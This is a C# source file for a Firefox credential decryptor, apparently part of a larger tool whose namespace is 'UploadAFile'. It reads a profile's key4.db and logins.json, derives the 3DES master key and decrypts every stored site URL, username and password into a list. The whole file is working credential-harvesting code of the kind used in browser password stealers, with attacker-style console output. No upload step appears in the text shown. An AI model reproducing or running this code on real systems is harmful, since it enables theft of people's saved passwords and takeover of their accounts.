using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace UploadAFile
{
    public class FirefoxDatabaseDecryptor
    {
        private string ProfileDir               { get; set; }
        private string Key4dbpath               { get; set; }
        private byte[] GlobalSalt               { get; set; }
        private byte[] EntrySaltPasswordCheck   { get; set; }
        private byte[] EntrySalt3DESKey         { get; set; }
        private byte[] CipherTextPasswordCheck  { get; set; }
        private byte[] CipherText3DESKey        { get; set; }
        private string MasterPassword           { get; set; }
        private byte[] DecryptedPasswordCheck   { get; set; }
        private byte[] Decrypted3DESKey         { get; set; }
        public List<BrowserLoginData> FirefoxLoginDataList { get; set; }

        public FirefoxDatabaseDecryptor(string profile, string password)
        {
            ProfileDir = profile;
            Key4dbpath = ProfileDir + @"\key4.db";
            MasterPassword = password;

            //Check profile for key4 database before attempting decryption
            if (File.Exists(Key4dbpath))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[+] Found Firefox credential database at: \"{Key4dbpath}\"");
                Console.ResetColor();

                // If Firefox version >= 75.0, asn.1 parser will throw IndexOutOfRange exception when trying to parse encrypted data as asn.1 DER encoded
                try
                {
                    Key4DatabaseConnection(Key4dbpath);
                }
                catch(IndexOutOfRangeException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] Could not correctly parse the contents of {Key4dbpath} - possibly incorrect Firefox version.");
                    Console.ResetColor();
                }
                

                //Store a RootObject from FirefoxLoginsJSON (hopefully) containing multiple FirefoxLoginsJSON.Login instances
                FirefoxLoginsJSON.Rootobject JSONLogins = GetJSONLogins(ProfileDir);

                //Decrypt password-check value to ensure correct decryption
                DecryptedPasswordCheck = Decrypt3DES(GlobalSalt, EntrySaltPasswordCheck, CipherTextPasswordCheck, MasterPassword);

                if (PasswordCheck(DecryptedPasswordCheck))
                {
                    //Decrypt master key (this becomes padded EDE key for username / password decryption)
                    //Master key should have 8 bytes of PKCS#7 Padding
                    Decrypted3DESKey = Decrypt3DES(GlobalSalt, EntrySalt3DESKey, CipherText3DESKey, MasterPassword);

                    //Check for PKCS#7 padding and remove if it exists
                    Decrypted3DESKey = Unpad(Decrypted3DESKey);

                    FirefoxLoginDataList = new List<BrowserLoginData>();

                    Console.ForegroundColor = ConsoleColor.Yellow;
                    foreach (FirefoxLoginsJSON.Login login in JSONLogins.Logins)
                    {                 
                        try
                        {
                            if (!(login.FormSubmitURL.Equals(null)))
                            {
                                byte[] usernameBytes = Convert.FromBase64String(login.EncryptedUsername);
                                byte[] passwordBytes = Convert.FromBase64String(login.EncryptedPassword);

                                ASN1 usernameASN1 = new ASN1(usernameBytes);

                                byte[] usernameIV = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
                                byte[] usernameEncrypted = usernameASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];

                                //Extract password ciphertext from logins.json
                                ASN1 passwordASN1 = new ASN1(passwordBytes);

                                byte[] passwordIV = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[0];
                                byte[] passwordEncrypted = passwordASN1.RootSequence.Sequences[0].Sequences[0].OctetStrings[1];

                                string decryptedUsername = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(usernameEncrypted, usernameIV, Decrypted3DESKey)));
                                string decryptedPassword = Encoding.UTF8.GetString(Unpad(Decrypt3DESLogins(passwordEncrypted, passwordIV, Decrypted3DESKey)));

                                BrowserLoginData loginData = new BrowserLoginData(login.FormSubmitURL, decryptedUsername, decryptedPassword, "Firefox");
                                FirefoxLoginDataList.Add(loginData);
                            }
                        }
                        catch (NullReferenceException)
                        {

                        }
                    }
                    Console.ResetColor();
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] No credential database found for Firefox profile: {ProfileDir}");
                Console.ResetColor();
            }
        }

        // read logins.json file and deserialize the JSON into FirefoxLoginsJSON class
        public FirefoxLoginsJSON.Rootobject GetJSONLogins(string profileDir)
        {

            if (File.Exists(profileDir + @"\logins.json"))
            {
                //Read logins.json from file and deserialise JSON into FirefoxLoginsJson object
                string file = File.ReadAllText(profileDir + @"\logins.json");
                FirefoxLoginsJSON.Rootobject JSONLogins = JsonConvert.DeserializeObject<FirefoxLoginsJSON.Rootobject>(file);

                return JSONLogins;
            }
            else
            {
                throw new FileNotFoundException($"Could not find file '{profileDir}\\logins.json.\nUnable to decrypt logins for this profile.'");
            }
            
        }

        public void Key4DatabaseConnection(string key4dbPath)
        {
            SQLiteConnection connection = new SQLiteConnection(
                $"Data Source={key4dbPath};" +
                $"Version=3;" +
                $"New=True");

            try
            {
                connection.Open();

                //First query the metadata table to verify the master password
                SQLiteCommand commandPasswordCheck = connection.CreateCommand();
                commandPasswordCheck.CommandText = "SELECT item1, item2 FROM metadata WHERE id = 'password'";
                SQLiteDataReader dataReader = commandPasswordCheck.ExecuteReader();

                //Parse the ASN.1 data in the 'password' row to extract entry salt and cipher text for master password verification
                while (dataReader.Read())
                {
                    GlobalSalt = (byte[])dataReader[0];

                    //https://docs.microsoft[.]com/en-us/dotnet/api/system.security.cryptography.asnencodeddata?view=netframework-4.8#constructors
                    byte[] item2Bytes = (byte[])dataReader[1];

                    ASN1 passwordCheckASN1 = new ASN1(item2Bytes);

                    EntrySaltPasswordCheck = passwordCheckASN1.RootSequence.Sequences[0].Sequences[0].Sequences[0].OctetStrings[0];
                    CipherTextPasswordCheck = passwordCheckASN1.RootSequence.Sequences[0].Sequences[0].Sequences[0].OctetStrings[1];
                }

                //Second, query the nssPrivate table for entry salt and encrypted 3DES key
                SQLiteCommand commandNSSPrivateQuery = connection.CreateCommand();
                commandNSSPrivateQuery.CommandText = "SELECT a11 FROM nssPrivate";
                dataReader = commandNSSPrivateQuery.ExecuteReader();

                //Parse the ASN.1 data from the nssPrivate table to extract entry salt and cipher text for encrypted 3DES master decryption key
                while (dataReader.Read())
                {
                    byte[] a11 = (byte[])dataReader[0];

                    ASN1 masterKeyASN1 = new ASN1(a11);

                    EntrySalt3DESKey = masterKeyASN1.RootSequence.Sequences[0].Sequences[0].Sequences[0].OctetStrings[0];
                    CipherText3DESKey = masterKeyASN1.RootSequence.Sequences[0].Sequences[0].Sequences[0].OctetStrings[1];
                }
            }
            catch (IndexOutOfRangeException)
            {
                 
                throw new IndexOutOfRangeException();
            }
            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] {e.Message}");
                Console.ResetColor();
            }
            finally
            {
                connection.Dispose();
            }
        }

        public static byte[] Decrypt3DES(byte[] globalSalt, byte[] entrySalt, byte[] cipherText, string masterPassword)
        {
            //https://github[.]com/lclevy/firepwd/blob/master/mozilla_pbe.pdf

            byte[] password = Encoding.UTF8.GetBytes(masterPassword);
            byte[] hashedPassword;
            byte[] keyFirstHalf;
            byte[] keySecondHalf;
            byte[] edeKey;
            byte[] decryptedResult;

            //Hashed Password = SHA1(salt + password)
            byte[] hashedPasswordBuffer = new byte[globalSalt.Length + password.Length];
            //Copy salt into first chunk of new buffer
            Buffer.BlockCopy(globalSalt, 0, hashedPasswordBuffer, 0, globalSalt.Length);
            //Copy password into second chunk of buffer
            Buffer.BlockCopy(password, 0, hashedPasswordBuffer, globalSalt.Length, password.Length);
            hashedPassword = hashedPasswordBuffer;
  
            using (SHA1 sha1 = new SHA1CryptoServiceProvider())
            {
                hashedPassword = sha1.ComputeHash(hashedPassword);
            }

            //Combined Hashed Password = SHA1(hashedpassword + entrysalt)
            byte[] combinedHashedPassword = new byte[hashedPassword.Length + entrySalt.Length];
            Buffer.BlockCopy(hashedPassword, 0, combinedHashedPassword, 0, hashedPassword.Length);
            Buffer.BlockCopy(entrySalt, 0, combinedHashedPassword, hashedPassword.Length, entrySalt.Length);

            using (SHA1 sha1 = new SHA1CryptoServiceProvider())
            {   
                combinedHashedPassword = sha1.ComputeHash(combinedHashedPassword);
            }

            //Create paddedEntrySalt
            byte[] paddedEntrySalt = new byte[20];
            Buffer.BlockCopy(entrySalt, 0, paddedEntrySalt, 0, entrySalt.Length);

            //Create and join the two halves of the encryption key
            try
            {
                using (HMACSHA1 hmac = new HMACSHA1(combinedHashedPassword))
                {
                    //First half of EDE Key = HMAC-SHA1( key=combinedHashedPassword, msg=paddedEntrySalt+entrySalt)
                    byte[] firstHalf = new byte[paddedEntrySalt.Length + entrySalt.Length];
                    Buffer.BlockCopy(paddedEntrySalt, 0, firstHalf, 0, paddedEntrySalt.Length);
                    Buffer.BlockCopy(entrySalt, 0, firstHalf, paddedEntrySalt.Length, entrySalt.Length);

                    //Create TK = HMAC-SHA1(combinedHashedPassword, paddedEntrySalt)
                    keyFirstHalf = hmac.ComputeHash(firstHalf);
                    byte[] tk = hmac.ComputeHash(paddedEntrySalt);

                    //Second half of EDE key = HMAC-SHA1(combinedHashedPassword, tk + entrySalt)
                    byte[] secondHalf = new byte[tk.Length + entrySalt.Length];
                    Buffer.BlockCopy(tk, 0, secondHalf, 0, entrySalt.Length);
                    Buffer.BlockCopy(entrySalt, 0, secondHalf, tk.Length, entrySalt.Length);

                    keySecondHalf = hmac.ComputeHash(secondHalf);

                    //Join first and second halves of EDE key
                    byte[] tempKey = new byte[keyFirstHalf.Length + keySecondHalf.Length];
                    Buffer.BlockCopy(keyFirstHalf, 0, tempKey, 0, keyFirstHalf.Length);
                    Buffer.BlockCopy(keySecondHalf, 0, tempKey, keyFirstHalf.Length, keySecondHalf.Length);

                    edeKey = tempKey;
                }

                byte[] key = new byte[24];
                byte[] iv = new byte[8];

                //Extract 3DES encryption key from first 24 bytes of EDE key
                Buffer.BlockCopy(edeKey, 0, key, 0, 24);

                //Extract initialization vector from last 8 bytes of EDE key
                Buffer.BlockCopy(edeKey, (edeKey.Length - 8), iv, 0, 8);

                using (TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider
                {
                    Key = key,
                    IV = iv,
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.None
                })
                {
                    ICryptoTransform cryptoTransform = tripleDES.CreateDecryptor();
                    decryptedResult = cryptoTransform.TransformFinalBlock(cipherText, 0, cipherText.Length);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"Exception {e}");
                decryptedResult = null;
            }
            Console.ResetColor();
            return decryptedResult;
        }

        public static byte[] Decrypt3DESLogins(byte[] cipherText, byte[] iv, byte[] key)
        {
            byte[] decryptedResult = new byte[cipherText.Length];

            try
            {
                using (TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider
                {
                    Key = key,
                    IV = iv,
                    Mode = CipherMode.CBC,
                    Padding = PaddingMode.None
                })
                {
                    ICryptoTransform cryptoTransform = tripleDES.CreateDecryptor();
                    decryptedResult = cryptoTransform.TransformFinalBlock(cipherText, 0, cipherText.Length);
                }
            }
            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[-] {e.Message}");
                Console.ResetColor();
            }
            return decryptedResult;
        }

        public static bool PasswordCheck(byte[] passwordCheck)
        {
            //checkValue = "password-check\x02\x02"
            byte[] checkValue = new byte[] { 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x2d, 0x63, 0x68, 0x65, 0x63, 0x6b, 0x02, 0x02 };

            if (passwordCheck.SequenceEqual(checkValue))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Password Check success!");
                Console.ResetColor();

                return true;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[-] Password Check Fail...");
                Console.ResetColor();

                return false;
            }
        }

        public byte[] Unpad(byte[] key)
        {
            bool paddingCheck = true;

            //Check integer value of last byte of array 
            int paddingValue = key[key.Length - 1];
            byte[] unpadded = new byte[key.Length - paddingValue];

            //Check last n bytes of key for equality where n = integer value of last byte
            for (int i = 1; i < (paddingValue + 1); i++)
            {
                if (!(key[key.Length - i] == paddingValue))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[-] Unpad() Error: Incorrect or Nil padding applied to byte array:\n{BitConverter.ToString(key)}");
                    Console.ResetColor();
                    //Throw exception here
                    paddingCheck = false;
                }
            }

            if (paddingCheck)
            {
                //Create new bytearray with trailing padding bytes removed
                Buffer.BlockCopy(key, 0, unpadded, 0, unpadded.Length);
            }

            return unpadded;
        }
    }
}
